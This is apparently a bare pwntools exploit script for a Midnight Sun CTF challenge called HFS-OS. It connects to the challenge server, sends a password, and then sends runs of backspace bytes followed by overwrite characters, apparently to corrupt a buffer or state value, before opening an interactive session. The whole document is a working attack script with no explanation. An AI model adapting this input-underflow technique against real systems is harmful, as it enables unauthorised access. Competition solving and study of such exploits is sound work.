from pwn import *
sock = remote('hfs-os-01.play.midnightsunctf.se', 31337)
sock.readuntil('[HFS_MBR]>') ; sock.send('sojupwner\r')
sock.readuntil('[HFS-DOS]>') ; sock.send('\x7f' * 11 + '\x74\r')
sock.readuntil('[HFS-DOS]>') ; sock.send('\x7f' * 3 + '2\r')
sock.readuntil('[HFS-DOS]>') ; sock.send('pong')
sock.interactive()
